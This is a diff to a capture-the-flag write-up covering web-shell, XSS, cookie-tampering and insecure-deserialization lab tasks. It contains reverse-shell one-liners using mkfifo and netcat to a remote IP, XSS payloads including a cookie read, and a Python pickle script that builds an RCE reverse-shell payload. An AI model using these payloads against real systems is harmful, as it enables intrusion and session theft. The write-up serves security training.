@@ -43,7 +43,7 @@ Use these links as references.
 Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef`, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.
 
 A reverse shell can also be spawned. A `netcat` listener can be spawned as below.
-{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code summary=NetCat-Command %}
+{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse shell.
 {% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code %}
@@ -280,17 +280,67 @@ Common payloads types used:
 
 Use `firefox` to change default browser's XSS protection mode. Change the setting `browser.urlbar.filter.javascript` to `false` in `about:config` settings page.
 
-Use `firefox` to load the url `http://<ip>` and select `Reflected XSS` tab. Use the payload `(<script>alert("Hello")</script>)` to get the popup `Hello` and the flag.
+Load the url `http://<ip>` and select `Reflected XSS` tab. Use the payload `(<script>alert("Hello")</script>)` to get the popup `Hello` and the flag.
 
-Use `firefox` to load the url `http://<ip>` and select `Reflected XSS` tab. Use the payload `(<script>alert(window.location.hostname)</script>)` to get the popup `<ip>` and the flag.
+Load the url `http://<ip>` and select `Reflected XSS` tab. Use the payload `(<script>alert(window.location.hostname)</script>)` to get the popup `<ip>` and the flag.
 
-Use `firefox` to load the url `http://<ip>` and select `Stored XSS` tab. Register for a dummy account. Use the payload `<h3>Testing</h3>` in comments section to get the comment appended and the flag.
+Load the url `http://<ip>` and select `Stored XSS` tab. Register for a dummy account. Use the payload `<h3>Testing</h3>` in comments section to get the comment appended and the flag.
 
-Use `firefox` to load the url `http://<ip>` and select `Stored XSS` tab. Use the payload `<script>alert(document.cookies)</script>` in comments section to get the popup `cookie` and the flag.
+Load the url `http://<ip>` and select `Stored XSS` tab. Use the payload `<script>alert(document.cookies)</script>` in comments section to get the popup `cookie` and the flag.
 
-Use `firefox` to load the url `http://<ip>` and select `Stored XSS` tab. Use the payload `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>` in comments section to change the value of header tag id `thm-title` to `I am a hacker` and get the flag.
+Load the url `http://<ip>` and select `Stored XSS` tab. Use the payload `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>` in comments section to change the value of header tag id `thm-title` to `I am a hacker` and get the flag.
 
 
 ## Task 21 - [Severity 8] Insecure Deserialization
+
+Insecure deserialization is replacing data processed by an application with malicious code, allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) to gain a foothold. The malicious code leverages the legitimate serialization and deserialization process used by web applications. Any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained are vulnerable.
+
+
+## Task 25 - [Severity 8] Insecure Deserislization - Cookies Practical
+
+Use `firefox` to load the url `http://<ip>`. Register using dummy credentials and login to the application.
+
+Inspect the page to read the cookie values from `storage` tab. Decode the `Session ID` from the cookie value, from `base64` using `cyberchef`, to get the flag.
+
+From the `inspect page` section and `storage` tab, rename the `usertype` value from `user` to `admin`. Load the url `http://<ip>/admin` to view admin dashboard and get the flag.
+
+
+## Task 26 - [Severity 8] Insecure Deserislization - Code Execution
+
+Use these links as references.
+- [RCE - Python Pickle](https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3){:target="_blank"}
+
+
+Create a python script from above url. Replace `IP` and `port` to local resources.
+{% capture code %}import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <ip> <port> > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce()))){% endcapture %} {% include code.html code=code %}
+
+Run the script `python rce.py` to generate payload.
+
+Use `netcat` to create a listener for payload.
+{% capture code %}nc -lnvp 4444{% endcapture %} {% include code.html code=code %}
+
+Use `firefox` to load the url `http://<ip>`. Register using dummy credentials and login to the application.
+
+Inspect the page to read the cookie values from `storage` tab. Replace the value of `encodedPayload` with previously generated payload. Reload the url to gain shell from `netcat` listener session.
+
+Find the file `flag.txt` from the shell and read its contents to get the flag.
+{% capture code %}find / -name flag.txt -type f 2>/dev/null
+cat <flag.txt>
+  <flag>{% endcapture %} {% include code.html code=code %}
+
+
+* Task 27 - [Severity 9] Components With Known Vulnerabilities - Intro
+
 
 
